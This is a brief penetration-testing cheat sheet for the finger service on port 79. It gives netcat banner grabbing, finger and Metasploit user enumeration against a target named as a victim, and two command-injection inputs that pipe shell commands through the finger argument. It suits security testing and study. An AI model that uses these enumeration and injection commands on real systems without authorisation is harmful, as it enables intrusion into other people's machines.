# Port 79 - Finger

## Banner Grabbing

```bash
nc -vn <IP> 79
echo "root" | nc -vn <IP> 79
```

## User Enumeration

```bash
finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user
```

Metasploit uses more tricks than Nmap.

```bash
use auxiliary/scanner/finger/finger_users
```

## Command Execution

```bash
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```